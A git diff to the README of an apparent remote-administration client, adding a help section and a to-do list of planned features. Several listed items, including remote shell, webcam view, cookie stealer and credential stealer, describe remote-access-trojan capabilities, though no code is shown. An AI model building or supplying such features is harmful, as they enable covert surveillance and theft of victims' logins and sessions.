@@ -17,3 +17,16 @@ You will find the Builded Client in Repos/Tewq/bin/debug
 # Help
 I will support anyone who asks for help. Make a ticket or add me on my discord: SpaceR#4641
 If anyone can help me setup my github page then dm me aswell.
+
+# To-do
+* Settings Form Code
+* Python 3.0 Installer
+* Python 3.0 Script Executer
+* System Infomartion
+* File Manager download/upload files
+* Startup Manager
+* Remote Shell
+* Registry Editor
+* Webcam View
+* Cookie Stealer
+* Credential Stealer
